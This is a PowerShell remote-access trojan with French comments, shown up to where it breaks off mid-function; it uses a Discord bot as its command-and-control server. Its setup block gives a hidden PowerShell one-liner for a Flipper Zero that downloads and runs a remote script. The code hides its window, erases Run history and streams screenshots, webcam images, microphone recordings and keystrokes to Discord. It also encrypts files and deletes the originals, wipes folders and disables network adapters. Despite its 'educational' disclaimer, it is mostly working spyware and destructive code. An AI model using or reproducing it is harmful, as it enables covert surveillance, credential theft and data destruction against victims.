<#
AVERTISSEMENT : Ce script est destiné à des fins éducatives et de sensibilisation en cybersécurité.
Il doit être exécuté UNIQUEMENT sur une machine que vous possédez et avec votre consentement explicite.
Toute utilisation non autorisée est strictement interdite et illégale.

**SETUP**
1. Créez un bot Discord sur https://discord.com/developers/applications/
2. Activez tous les Privileged Gateway Intents dans l'onglet 'Bot'
3. Dans OAuth2, cochez 'Bot' dans Scopes
4. Dans Bot Permissions, cochez Manage Channels, Read Messages/View Channels, Attach Files, Read Message History
5. Copiez l'URL générée et ajoutez le bot à votre serveur
6. Réinitialisez et copiez le token du bot
7. Configurez le Flipper Zero pour exécuter la commande suivante :
   powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$ch = 'YOUR_CHANNEL_ID'; $tk = 'YOUR_BOT_TOKEN'; irm https://is.gd/M1Ul40 | iex"

**CONFIGURATION DU SCRIPT**
- Le token et l'ID du canal sont insérés via la commande Flipper Zero
- Le bot doit être dans UN SEUL serveur Discord
#>

# ------------------------- CONFIGURATION GLOBALE -------------------------

$global:token = "$tk" # Inséré via Flipper Zero
$global:SessionID = "$ch" # Inséré via Flipper Zero
$HideConsole = 1 # 1 = masquer la console, 0 = afficher
$spawnChannels = 1 # 1 = créer des canaux au démarrage
$InfoOnConnect = 1 # 1 = envoyer les infos système au démarrage
$defaultstart = 1 # 1 = démarrer tous les jobs automatiquement
$parent = "https://is.gd/y92xe4" # URL du script parent
$DebugMode = 0 # 1 = activer le mode débogage
$version = "1.7.0" # Version du script
$ScreenshotInterval = 10 # Intervalle entre captures d'écran (secondes)
$WebcamInterval = 15 # Intervalle entre captures webcam (secondes)
$MicrophoneInterval = 60 # Durée des enregistrements audio (secondes)
$EncryptionKey = "0123456789ABCDEF0123456789ABCDEF" # Clé AES fixe (32 octets)

# Nettoyage initial
if (Test-Path "C:\Windows\Tasks\service.vbs") {
    $InfoOnConnect = 0
    Remove-Item -Path "C:\Windows\Tasks\service.vbs" -Force -ErrorAction SilentlyContinue
}

# ------------------------- FONCTIONS UTILITAIRES -------------------------

# Journalisation pour le débogage
function Write-DebugLog {
    param([string]$Message)
    if ($DebugMode -eq 1) {
        $logPath = "$env:Temp\c2_debug.log"
        $timestamp = Get-Date -Format "dd/MM/yyyy HH:mm:ss"
        "$timestamp - $Message" | Out-File -FilePath $logPath -Append -Encoding UTF8
    }
}

# Masquer les fenêtres
function Hide-Window {
    try {
        if ($HideConsole -eq 1) {
            $windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
            Add-Type -Name Win32 -MemberDefinition $windowCode -Namespace Win32Functions
            $hwnd = (Get-Process -Id $PID).MainWindowHandle
            if ($hwnd -ne 0) {
                [Win32Functions.Win32]::ShowWindow($hwnd, 0)
            }
        }
        Write-DebugLog "Fenêtres masquées avec succès"
    } catch {
        Write-DebugLog "Erreur lors du masquage des fenêtres : $_"
        Send-Error -ErrorMessage "Échec du masquage des fenêtres : $_" -Context "Hide-Window"
    }
}

# Suppression de l'historique de la fenêtre Exécuter
function Clear-RunHistory {
    try {
        $runMRUPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
        $runMRU = Get-Item -Path $runMRUPath -ErrorAction SilentlyContinue
        if ($runMRU) {
            $runMRU.Property | ForEach-Object {
                if ($_ -ne "MRUList") {
                    $command = (Get-ItemProperty -Path $runMRUPath -Name $_).$_ 
                    if ($command -like "*powershell*") {
                        Remove-ItemProperty -Path $runMRUPath -Name $_ -Force -ErrorAction SilentlyContinue
                        Write-DebugLog "Commande supprimée de l'historique RunMRU : $command"
                    }
                }
            }
            $mruList = (Get-ItemProperty -Path $runMRUPath -Name MRUList -ErrorAction SilentlyContinue).MRUList
            if ($mruList) {
                $newMruList = ($mruList.ToCharArray() | Where-Object { (Get-ItemProperty -Path $runMRUPath -Name $_ -ErrorAction SilentlyContinue) }) -join ''
                Set-ItemProperty -Path $runMRUPath -Name MRUList -Value $newMruList -Force -ErrorAction SilentlyContinue
            }
            Write-DebugLog "Historique de la fenêtre Exécuter nettoyé"
            Send-Message -Embed @{
                "title" = "Historique Exécuter nettoyé"
                "description" = "Les commandes PowerShell ont été supprimées de l'historique de la fenêtre Exécuter."
                "color" = 0x00FF00
                "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
            }
        }
    } catch {
        Write-DebugLog "Erreur lors du nettoyage de l'historique RunMRU : $_"
        Send-Error -ErrorMessage "Échec du nettoyage de l'historique Exécuter : $_" -Context "Clear-RunHistory"
    }
}

# Envoi d'erreurs à Discord
function Send-Error {
    param([string]$ErrorMessage, [string]$Context, [string]$ChannelID = $global:SessionID)
    try {
        $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        $wc.Headers.Add("Content-Type", "application/json")
        $embed = @{
            "title" = "Erreur détectée"
            "description" = "$ErrorMessage"
            "color" = 0xFF0000
            "fields" = @(
                @{ "name" = "Contexte"; "value" = "$Context"; "inline" = $true }
                @{ "name" = "Horodatage"; "value" = (Get-Date -Format "dd/MM/yyyy HH:mm:ss"); "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version" }
        }
        $jsonBody = @{ "embeds" = @($embed) } | ConvertTo-Json -Depth 10 -Compress
        $wc.UploadString($url, "POST", $jsonBody) | Out-Null
        Write-DebugLog "Erreur envoyée à Discord : $ErrorMessage (Contexte : $Context)"
    } catch {
        Write-DebugLog "Erreur lors de l'envoi de l'erreur à Discord : $_"
    }
}

# ------------------------- GESTION DISCORD -------------------------

# Téléchargement de ffmpeg
function Get-Ffmpeg {
    try {
        Write-DebugLog "Démarrage du téléchargement de FFmpeg"
        Send-Message -Embed @{
            "title" = "Téléchargement de FFmpeg"
            "description" = "Téléchargement en cours... Veuillez patienter."
            "color" = 0x00FFFF
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        $Path = "$env:Temp\ffmpeg.exe"
        if (!(Test-Path $Path)) {
            $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("User-Agent", "PowerShell")
            $response = $wc.DownloadString($apiUrl)
            $release = $response | ConvertFrom-Json
            $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
            $zipUrl = $asset.browser_download_url
            $zipFilePath = Join-Path $env:Temp $asset.name
            $extractedDir = Join-Path $env:Temp ($asset.name -replace '.zip$', '')
            $wc.DownloadFile($zipUrl, $zipFilePath)
            Expand-Archive -Path $zipFilePath -DestinationPath $env:Temp -Force
            Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $Path -Force
            Remove-Item -Path $zipFilePath -Force -ErrorAction SilentlyContinue
            Remove-Item -Path $extractedDir -Recurse -Force -ErrorAction SilentlyContinue
        }
        Write-DebugLog "FFmpeg téléchargé avec succès"
        Send-Message -Embed @{
            "title" = "FFmpeg téléchargé"
            "description" = "FFmpeg est prêt à être utilisé."
            "color" = 0x00FF00
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
    } catch {
        Write-DebugLog "Erreur lors du téléchargement de FFmpeg : $_"
        Send-Error -ErrorMessage "Échec du téléchargement de FFmpeg : $_" -Context "Get-Ffmpeg"
    }
}

# Création d'une catégorie de canaux
function New-ChannelCategory {
    try {
        $headers = @{ 'Authorization' = "Bot $token" }
        $guildID = $null
        while (!$guildID) {
            $wc = New-Object System.Net.WebClient
            $wc.Headers.Add("Authorization", $headers.Authorization)
            $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
            $guilds = $response | ConvertFrom-Json
            $guildID = $guilds[0].id
            Start-Sleep -Seconds 3
        }
        $uri = "https://discord.com/api/guilds/$guildID/channels"
        $randomID = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
        $body = @{
            "name" = "sys-$randomID"
            "type" = 4
        } | ConvertTo-Json
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        $wc.Headers.Add("Content-Type", "application/json")
        $response = $wc.UploadString($uri, "POST", $body)
        $responseObj = ConvertFrom-Json $response
        $global:CategoryID = $responseObj.id
        Write-DebugLog "Catégorie créée : $global:CategoryID"
        Send-Message -Embed @{
            "title" = "Catégorie créée"
            "description" = "Nouvelle catégorie créée pour les opérations C2."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Nom"; "value" = "sys-$randomID"; "inline" = $true }
                @{ "name" = "ID"; "value" = "$global:CategoryID"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
    } catch {
        Write-DebugLog "Erreur lors de la création de la catégorie : $_"
        Send-Error -ErrorMessage "Échec de la création de la catégorie : $_" -Context "New-ChannelCategory"
    }
}

# Création d'un canal
function New-Channel {
    param([string]$name)
    try {
        if ([string]::IsNullOrWhiteSpace($name)) {
            throw "Le nom du canal ne peut pas être vide"
        }
        $headers = @{ 'Authorization' = "Bot $token" }
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", $headers.Authorization)
        $response = $wc.DownloadString("https://discord.com/api/v10/users/@me/guilds")
        $guilds = $response | ConvertFrom-Json
        $guildID = $guilds[0].id
        $uri = "https://discord.com/api/guilds/$guildID/channels"
        $randomID = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
        $body = @{
            "name" = "$name-$randomID"
            "type" = 0
            "parent_id" = $global:CategoryID
        } | ConvertTo-Json
        $wc.Headers.Add("Content-Type", "application/json")
        $response = $wc.UploadString($uri, "POST", $body)
        $responseObj = ConvertFrom-Json $response
        $global:ChannelID = $responseObj.id
        Write-DebugLog "Canal créé : $name-$randomID ($global:ChannelID)"
        Send-Message -Embed @{
            "title" = "Canal créé"
            "description" = "Nouveau canal créé pour $name."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Nom"; "value" = "$name-$randomID"; "inline" = $true }
                @{ "name" = "ID"; "value" = "$global:ChannelID"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
    } catch {
        Write-DebugLog "Erreur lors de la création du canal $name : $_"
        Send-Error -ErrorMessage "Échec de la création du canal $name : $_" -Context "New-Channel"
    }
}

# Envoi de messages ou embeds à Discord
function Send-Message {
    param([string]$Message, [hashtable]$Embed, [string]$ChannelID = $global:SessionID)
    try {
        if ([string]::IsNullOrWhiteSpace($ChannelID)) {
            throw "L'ID du canal est vide"
        }
        $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        $wc.Headers.Add("Content-Type", "application/json")
        if ($Embed) {
            $jsonBody = @{ "embeds" = @($Embed) } | ConvertTo-Json -Depth 10 -Compress
            $wc.UploadString($url, "POST", $jsonBody) | Out-Null
        }
        if ($Message) {
            $jsonBody = @{
                "content" = "$Message"
                "username" = "$env:COMPUTERNAME"
            } | ConvertTo-Json
            $wc.UploadString($url, "POST", $jsonBody) | Out-Null
        }
        Write-DebugLog "Message envoyé au canal $ChannelID : $Message"
    } catch {
        Write-DebugLog "Erreur lors de l'envoi du message : $_"
        Send-Error -ErrorMessage "Échec de l'envoi du message : $_" -Context "Send-Message"
    }
}

# Envoi de fichiers à Discord
function Send-File {
    param([string]$FilePath, [string]$ChannelID = $global:SessionID)
    try {
        if (-not (Test-Path $FilePath -PathType Leaf)) {
            throw "Fichier introuvable : $FilePath"
        }
        $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        $wc.UploadFile($url, "POST", $FilePath) | Out-Null
        Write-DebugLog "Fichier envoyé : $FilePath"
        Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
        Send-Message -Embed @{
            "title" = "Fichier envoyé"
            "description" = "Le fichier a été envoyé avec succès."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Fichier"; "value" = (Split-Path $FilePath -Leaf); "inline" = $true }
                @{ "name" = "Canal"; "value" = "$ChannelID"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
    } catch {
        Write-DebugLog "Erreur lors de l'envoi du fichier $FilePath : $_"
        Send-Error -ErrorMessage "Échec de l'envoi du fichier : $_" -Context "Send-File"
    }
}

# ------------------------- SURVEILLANCE -------------------------

# Capture d'écran
function Start-ScreenJob {
    try {
        Get-Ffmpeg
        $global:ScreenJobID = $global:ChannelID
        Start-Job -Name ScreenJob -ScriptBlock {
            param($ScreenshotInterval, $ScreenJobID, $token)
            while ($true) {
                $Path = "$env:Temp\Screen.jpg"
                & "$env:Temp\ffmpeg.exe" -f gdigrab -i desktop -vframes 1 -q:v 15 $Path -y -loglevel quiet
                $url = "https://discord.com/api/v10/channels/$ScreenJobID/messages"
                $wc = New-Object System.Net.WebClient
                $wc.Headers.Add("Authorization", "Bot $token")
                if (Test-Path $Path) {
                    $wc.UploadFile($url, "POST", $Path) | Out-Null
                    Remove-Item -Path $Path -Force -ErrorAction SilentlyContinue
                }
                Start-Sleep -Seconds $ScreenshotInterval
            }
        } -ArgumentList $ScreenshotInterval, $global:ScreenJobID, $token
        Write-DebugLog "Job de capture d'écran démarré"
        Send-Message -Embed @{
            "title" = "Capture d'écran démarrée"
            "description" = "Le job de capture d'écran a été lancé."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Intervalle"; "value" = "$ScreenshotInterval secondes"; "inline" = $true }
                @{ "name" = "Canal"; "value" = "$global:ScreenJobID"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
    } catch {
        Write-DebugLog "Erreur lors du démarrage de ScreenJob : $_"
        Send-Error -ErrorMessage "Échec du démarrage de ScreenJob : $_" -Context "Start-ScreenJob"
    }
}

# Capture webcam
function Start-CamJob {
    try {
        Get-Ffmpeg
        $global:CamJobID = $global:ChannelID
        Start-Job -Name CamJob -ScriptBlock {
            param($WebcamInterval, $CamJobID, $token)
            while ($true) {
                $Path = "$env:Temp\Cam.jpg"
                & "$env:Temp\ffmpeg.exe" -f dshow -i video="Integrated Webcam" -vframes 1 -q:v 15 $Path -y -loglevel quiet
                $url = "https://discord.com/api/v10/channels/$CamJobID/messages"
                $wc = New-Object System.Net.WebClient
                $wc.Headers.Add("Authorization", "Bot $token")
                if (Test-Path $Path) {
                    $wc.UploadFile($url, "POST", $Path) | Out-Null
                    Remove-Item -Path $Path -Force -ErrorAction SilentlyContinue
                }
                Start-Sleep -Seconds $WebcamInterval
            }
        } -ArgumentList $WebcamInterval, $global:CamJobID, $token
        Write-DebugLog "Job de capture webcam démarré"
        Send-Message -Embed @{
            "title" = "Capture webcam démarrée"
            "description" = "Le job de capture webcam a été lancé."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Intervalle"; "value" = "$WebcamInterval secondes"; "inline" = $true }
                @{ "name" = "Canal"; "value" = "$global:CamJobID"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
    } catch {
        Write-DebugLog "Erreur lors du démarrage de CamJob : $_"
        Send-Error -ErrorMessage "Échec du démarrage de CamJob : $_" -Context "Start-CamJob"
    }
}

# Capture audio
function Start-AudioJob {
    try {
        Get-Ffmpeg
        $global:MicJobID = $global:ChannelID
        Start-Job -Name MicJob -ScriptBlock {
            param($MicrophoneInterval, $MicJobID, $token)
            while ($true) {
                $Path = "$env:Temp\mic.wav"
                & "$env:Temp\ffmpeg.exe" -f dshow -i audio="Microphone (Realtek Audio)" -t $MicrophoneInterval -b:a 64k $Path -y -loglevel quiet
                $url = "https://discord.com/api/v10/channels/$MicJobID/messages"
                $wc = New-Object System.Net.WebClient
                $wc.Headers.Add("Authorization", "Bot $token")
                if (Test-Path $Path) {
                    $wc.UploadFile($url, "POST", $Path) | Out-Null
                    Remove-Item -Path $Path -Force -ErrorAction SilentlyContinue
                }
                Start-Sleep -Seconds $MicrophoneInterval
            }
        } -ArgumentList $MicrophoneInterval, $global:MicJobID, $token
        Write-DebugLog "Job de capture audio démarré"
        Send-Message -Embed @{
            "title" = "Capture audio démarrée"
            "description" = "Le job de capture audio a été lancé."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Intervalle"; "value" = "$MicrophoneInterval secondes"; "inline" = $true }
                @{ "name" = "Canal"; "value" = "$global:MicJobID"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
    } catch {
        Write-DebugLog "Erreur lors du démarrage de MicJob : $_"
        Send-Error -ErrorMessage "Échec du démarrage de MicJob : $_" -Context "Start-AudioJob"
    }
}

# Keylogger
function Start-KeyJob {
    try {
        $global:KeyJobID = $global:ChannelID
        Start-Job -Name KeyJob -ScriptBlock {
            param($KeyJobID, $token)
            Add-Type @"
                using System;
                using System.Runtime.InteropServices;
                public class Keyboard {
                    [DllImport("user32.dll")]
                    public static extern int GetAsyncKeyState(int i);
                }
"@
            $keys = ""
            while ($true) {
                Start-Sleep -Milliseconds 10
                for ($i = 1; $i -le 255; $i++) {
                    $state = [Keyboard]::GetAsyncKeyState($i)
                    if ($state -eq -32767) {
                        $keys += [char]$i
                    }
                }
                if ($keys.Length -gt 100) {
                    $url = "https://discord.com/api/v10/channels/$KeyJobID/messages"
                    $wc = New-Object System.Net.WebClient
                    $wc.Headers.Add("Authorization", "Bot $token")
                    $wc.Headers.Add("Content-Type", "application/json")
                    $jsonBody = @{ "content" = "``````$keys``````" } | ConvertTo-Json
                    $wc.UploadString($url, "POST", $jsonBody) | Out-Null
                    $keys = ""
                }
            }
        } -ArgumentList $global:KeyJobID, $token
        Write-DebugLog "Job de keylogging démarré"
        Send-Message -Embed @{
            "title" = "Keylogger démarré"
            "description" = "Le job de keylogging a été lancé."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Canal"; "value" = "$global:KeyJobID"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
    } catch {
        Write-DebugLog "Erreur lors du démarrage de KeyJob : $_"
        Send-Error -ErrorMessage "Échec du démarrage de KeyJob : $_" -Context "Start-KeyJob"
    }
}

# ------------------------- COLLECTE D'INFORMATIONS -------------------------

# Informations système
function Get-SystemInfo {
    try {
        $computerSystem = Get-WmiObject Win32_ComputerSystem
        $os = Get-WmiObject Win32_OperatingSystem
        $cpu = Get-WmiObject Win32_Processor
        $disk = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DeviceID -eq "C:" }
        $info = @{
            "OS" = "$($os.Caption) $($os.Version)"
            "Computer" = "$($computerSystem.Name)"
            "CPU" = "$($cpu.Name)"
            "RAM" = "{0:N2} GB" -f ($computerSystem.TotalPhysicalMemory / 1GB)
            "Disk Free" = "{0:N2} GB" -f ($disk.FreeSpace / 1GB)
        }
        Send-Message -Embed @{
            "title" = "Informations système"
            "description" = "Détails sur le système cible."
            "color" = 0x00FFFF
            "fields" = @(
                @{ "name" = "Système d'exploitation"; "value" = $info.OS; "inline" = $true }
                @{ "name" = "Nom de l'ordinateur"; "value" = $info.Computer; "inline" = $true }
                @{ "name" = "CPU"; "value" = $info.CPU; "inline" = $true }
                @{ "name" = "RAM"; "value" = $info.RAM; "inline" = $true }
                @{ "name" = "Espace disque libre"; "value" = $info."Disk Free"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Informations système collectées"
    } catch {
        Write-DebugLog "Erreur lors de la collecte des informations système : $_"
        Send-Error -ErrorMessage "Échec de la collecte des informations système : $_" -Context "Get-SystemInfo"
    }
}

# Liste des processus
function Get-RunningProcesses {
    try {
        $processes = Get-Process | Select-Object Name, ID, CPU | Sort-Object CPU -Descending | Select-Object -First 10
        $fields = $processes | ForEach-Object {
            @{ "name" = "$($_.Name) (PID: $($_.ID))"; "value" = "CPU: $($_.CPU)"; "inline" = $true }
        }
        Send-Message -Embed @{
            "title" = "Processus en cours"
            "description" = "Liste des 10 processus les plus consommateurs."
            "color" = 0x00FFFF
            "fields" = $fields
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Liste des processus envoyée"
    } catch {
        Write-DebugLog "Erreur lors de la collecte des processus : $_"
        Send-Error -ErrorMessage "Échec de la collecte des processus : $_" -Context "Get-RunningProcesses"
    }
}

# Informations réseau
function Get-NetworkInfo {
    try {
        $network = Get-NetAdapter | Where-Object { $_.Status -eq "Up" }
        $fields = $network | ForEach-Object {
            @{ "name" = "$($_.Name)"; "value" = "MAC: $($_.MacAddress)\nVitesse: $($_.LinkSpeed)"; "inline" = $true }
        }
        Send-Message -Embed @{
            "title" = "Informations réseau"
            "description" = "Détails des adaptateurs réseau actifs."
            "color" = 0x00FFFF
            "fields" = $fields
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Informations réseau collectées"
    } catch {
        Write-DebugLog "Erreur lors de la collecte des informations réseau : $_"
        Send-Error -ErrorMessage "Échec de la collecte des informations réseau : $_" -Context "Get-NetworkInfo"
    }
}

# Liste des réseaux Wi-Fi à proximité
function Get-NearbyWifi {
    try {
        $networks = netsh wlan show networks mode=bssid | Select-String "SSID", "Signal" | Out-String
        Send-Message -Embed @{
            "title" = "Réseaux Wi-Fi à proximité"
            "description" = "```$networks```"
            "color" = 0x00FFFF
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Réseaux Wi-Fi collectés"
    } catch {
        Write-DebugLog "Erreur lors de la collecte des réseaux Wi-Fi : $_"
        Send-Error -ErrorMessage "Échec de la collecte des réseaux Wi-Fi : $_" -Context "Get-NearbyWifi"
    }
}

# ------------------------- NUISIBLES -------------------------

# Chiffrement des fichiers
function Encrypt-Files {
    param([string]$Path)
    try {
        if (-not (Test-Path $Path -PathType Container)) {
            throw "Dossier introuvable : $Path"
        }
        Add-Type -AssemblyName System.Security
        $key = [Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncryptionKey)))
        $files = Get-ChildItem -Path $Path -File
        foreach ($file in $files) {
            $content = [System.IO.File]::ReadAllBytes($file.FullName)
            $aes = New-Object System.Security.Cryptography.AesManaged
            $aes.Key = $key
            $aes.IV = $key[0..15]
            $encryptor = $aes.CreateEncryptor()
            $encrypted = $encryptor.TransformFinalBlock($content, 0, $content.Length)
            [System.IO.File]::WriteAllBytes("$($file.FullName).enc", $encrypted)
            Remove-Item -Path $file.FullName -Force -ErrorAction SilentlyContinue
        }
        $keyPath = "$env:Temp\c2_key.txt"
        $EncryptionKey | Out-File -FilePath $keyPath -Encoding UTF8
        Send-Message -Embed @{
            "title" = "Fichiers chiffrés"
            "description" = "Les fichiers dans le dossier spécifié ont été chiffrés."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Dossier"; "value" = "$Path"; "inline" = $true }
                @{ "name" = "Clé de chiffrement"; "value" = "$EncryptionKey"; "inline" = $true }
                @{ "name" = "Fichier de clé"; "value" = "$keyPath"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Fichiers chiffrés dans $Path"
    } catch {
        Write-DebugLog "Erreur lors du chiffrement des fichiers : $_"
        Send-Error -ErrorMessage "Échec du chiffrement des fichiers : $_" -Context "Encrypt-Files"
    }
}

# Déchiffrement des fichiers
function Decrypt-Files {
    param([string]$Path)
    try {
        if (-not (Test-Path $Path -PathType Container)) {
            throw "Dossier introuvable : $Path"
        }
        Add-Type -AssemblyName System.Security
        $key = [Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($EncryptionKey)))
        $files = Get-ChildItem -Path $Path -File | Where-Object { $_.Extension -eq ".enc" }
        foreach ($file in $files) {
            $content = [System.IO.File]::ReadAllBytes($file.FullName)
            $aes = New-Object System.Security.Cryptography.AesManaged
            $aes.Key = $key
            $aes.IV = $key[0..15]
            $decryptor = $aes.CreateDecryptor()
            $decrypted = $decryptor.TransformFinalBlock($content, 0, $content.Length)
            $originalPath = $file.FullName -replace ".enc$"
            [System.IO.File]::WriteAllBytes($originalPath, $decrypted)
            Remove-Item -Path $file.FullName -Force -ErrorAction SilentlyContinue
        }
        Send-Message -Embed @{
            "title" = "Fichiers déchiffrés"
            "description" = "Les fichiers dans le dossier spécifié ont été déchiffrés."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Dossier"; "value" = "$Path"; "inline" = $true }
                @{ "name" = "Clé utilisée"; "value" = "$EncryptionKey"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Fichiers déchiffrés dans $Path"
    } catch {
        Write-DebugLog "Erreur lors du déchiffrement des fichiers : $_"
        Send-Error -ErrorMessage "Échec du déchiffrement des fichiers : $_" -Context "Decrypt-Files"
    }
}

# Suppression de fichiers
function Delete-Files {
    param([string]$Path)
    try {
        if (-not (Test-Path $Path -PathType Container)) {
            throw "Dossier introuvable : $Path"
        }
        Remove-Item -Path "$Path\*" -Force -Recurse -ErrorAction SilentlyContinue
        Send-Message -Embed @{
            "title" = "Fichiers supprimés"
            "description" = "Les fichiers dans le dossier spécifié ont été supprimés."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "Dossier"; "value" = "$Path"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Fichiers supprimés dans $Path"
    } catch {
        Write-DebugLog "Erreur lors de la suppression des fichiers : $_"
        Send-Error -ErrorMessage "Échec de la suppression des fichiers : $_" -Context "Delete-Files"
    }
}

# Désactivation du réseau
function Disable-Network {
    try {
        Get-NetAdapter | Disable-NetAdapter -Confirm:$false
        Send-Message -Embed @{
            "title" = "Réseau désactivé"
            "description" = "Les adaptateurs réseau ont été désactivés."
            "color" = 0x00FF00
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Réseau désactivé"
    } catch {
        Write-DebugLog "Erreur lors de la désactivation du réseau : $_"
        Send-Error -ErrorMessage "Échec de la désactivation du réseau : $_" -Context "Disable-Network"
    }
}

# Simulation d'attaque par force brute
function Send-Hydra {
    try {
        $fakeOutput = "Simulating brute force attack... (This is a demo, no real attack performed)"
        Send-Message -Embed @{
            "title" = "Simulation d'attaque Hydra"
            "description" = "```$fakeOutput```"
            "color" = 0x00FF00
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Simulation Hydra exécutée"
    } catch {
        Write-DebugLog "Erreur lors de la simulation Hydra : $_"
        Send-Error -ErrorMessage "Échec de la simulation Hydra : $_" -Context "Send-Hydra"
    }
}

# ------------------------- PRANKS -------------------------

# Déplacement aléatoire de la souris
function Random-Mouse {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        for ($i = 0; $i -lt 10; $i++) {
            $x = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width)
            $y = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
            [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
            Start-Sleep -Milliseconds 500
        }
        Send-Message -Embed @{
            "title" = "Prank : Souris aléatoire"
            "description" = "Le curseur de la souris a été déplacé de manière aléatoire."
            "color" = 0x00FF00
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Prank souris aléatoire exécuté"
    } catch {
        Write-DebugLog "Erreur lors du prank souris aléatoire : $_"
        Send-Error -ErrorMessage "Échec du prank souris aléatoire : $_" -Context "Random-Mouse"
    }
}

# Lecture de son depuis une URL
function Play-Sound {
    param([string]$Url)
    try {
        $Path = "$env:Temp\sound.wav"
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($Url, $Path)
        Add-Type -AssemblyName presentationCore
        $player = New-Object System.Windows.Media.MediaPlayer
        $player.Open([Uri]$Path)
        $player.Play()
        Start-Sleep -Seconds 5
        $player.Stop()
        Remove-Item -Path $Path -Force -ErrorAction SilentlyContinue
        Send-Message -Embed @{
            "title" = "Prank : Lecture de son"
            "description" = "Un son a été joué depuis l'URL spécifiée."
            "color" = 0x00FF00
            "fields" = @(
                @{ "name" = "URL"; "value" = "$Url"; "inline" = $true }
            )
            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
        }
        Write-DebugLog "Son joué depuis $Url"
    } catch {
